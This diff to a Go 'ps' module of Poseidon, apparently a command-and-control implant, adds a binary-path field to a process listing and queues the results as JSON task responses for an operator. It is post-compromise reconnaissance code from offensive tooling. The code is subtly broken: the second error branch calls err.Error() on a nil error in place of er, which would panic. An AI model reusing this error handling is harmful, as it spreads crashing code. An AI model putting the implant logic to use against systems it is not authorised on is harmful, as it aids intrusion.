@@ -2,9 +2,13 @@ package ps
 
 import (
 	"encoding/json"
+	"sync"
 
+	"github.com/xorrior/poseidon/pkg/profiles"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
+
+var mu sync.Mutex
 
 // Taken directly from Sliver's PS command. License file included in the folder
 
@@ -25,6 +29,9 @@ type Process interface {
 
 	// Owner is the account name of the process owner.
 	Owner() string
+
+	// bin_path of the running process
+	BinPath() string
 }
 
 //ProcessArray - struct that will hold all of the Process results
@@ -35,21 +42,26 @@ type ProcessArray struct {
 type ProcessDetails struct {
 	ProcessID       int    `json:"process_id"`
 	ParentProcessID int    `json:"parent_process_id"`
-	Arch            string `json:"arch"`
-	Path            string `json:"path"`
+	Arch            string `json:"architecture"`
+	Path            string `json:"name"`
 	User            string `json:"user"`
+	BinPath         string `json:"bin_path"`
 }
 
 //Run - interface method that retrieves a process list
-func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
+func Run(task structs.Task) {
 	procs, err := processes()
-	tMsg := structs.ThreadMsg{}
-	tMsg.Error = false
-	tMsg.TaskItem = task
+	msg := structs.Response{}
+	msg.TaskID = task.TaskID
 	if err != nil {
-		tMsg.Error = true
-		tMsg.TaskResult = []byte(err.Error())
-		threadChannel <- tMsg
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
 
@@ -62,6 +74,7 @@ func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
 		p[index].ParentProcessID = procs[index].PPid()
 		p[index].User = procs[index].Owner()
 		p[index].Path = procs[index].Executable()
+		p[index].BinPath = procs[index].BinPath()
 	}
 
 	var pa ProcessArray
@@ -69,12 +82,21 @@ func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
 	jsonProcs, er := json.MarshalIndent(p, "", "	")
 
 	if er != nil {
-		tMsg.Error = true
-		tMsg.TaskResult = []byte(er.Error())
-		threadChannel <- tMsg
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
-
-	tMsg.TaskResult = jsonProcs
-	threadChannel <- tMsg
+	msg.Completed = true
+	msg.UserOutput = string(jsonProcs)
+	resp, _ := json.Marshal(msg)
+	mu.Lock()
+	profiles.TaskResponses = append(profiles.TaskResponses, resp)
+	mu.Unlock()
+	return
 }
